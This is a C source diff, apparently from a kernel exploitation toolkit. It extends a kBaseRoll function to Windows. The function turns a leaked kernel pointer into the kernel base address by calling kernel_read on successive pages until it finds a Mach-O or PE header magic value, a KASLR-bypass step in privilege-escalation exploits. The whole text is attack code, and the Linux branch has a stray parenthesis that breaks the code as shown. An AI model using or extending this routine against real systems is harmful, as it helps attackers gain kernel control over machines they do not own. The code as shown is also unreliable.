@@ -14,6 +14,12 @@
 #endif
 #include "krw_util.h"
 
+#ifdef __APPLE__
+#define HEADER_MAGIC (MH_MAGIC_64)
+#elif defined(_WIN32)
+#define HEADER_MAGIC (IMAGE_DOS_SIGNATURE | 0x00900000)
+#endif
+
 // kbaseroll macros happen in 4 stages, incase it needs to be broken up
     // includes
     // variable definitions
@@ -23,7 +29,7 @@ int kBaseRoll(size_t* kbase_a)
 {
     int result = -1;
     size_t leakAddr = 0;
-#ifdef __APPLE__
+#if defined(__APPLE__) || defined(_WIN32)
     uint32_t magic_check = 0;
 #elif defined(__linux__)
     uint8_t buf[0x60] = {0};
@@ -34,15 +40,14 @@ int kBaseRoll(size_t* kbase_a)
     kernel_leak(&leakAddr);
 #ifdef __APPLE__
     leakAddr |= KADDR_MASK;
-#elif defined(__linux__)
 #endif
     leakAddr &= ~PAGE_MASK4K;
     // mac, ballparks around 0x160?
     for (int i = 0; i < 0x400; i++)
     {
-#ifdef __APPLE__
+#if defined(__APPLE__) || defined(_WIN32)
         kernel_read(&magic_check, sizeof(magic_check), leakAddr);
-        FINISH_IF(magic_check == MH_MAGIC_64);
+        FINISH_IF(magic_check == HEADER_MAGIC);
 #elif defined(__linux__)
         kernel_read(buf, sizeof(buf), leakAddr);)
         parseInst(*(uint32_t*)buf, &instTemp);
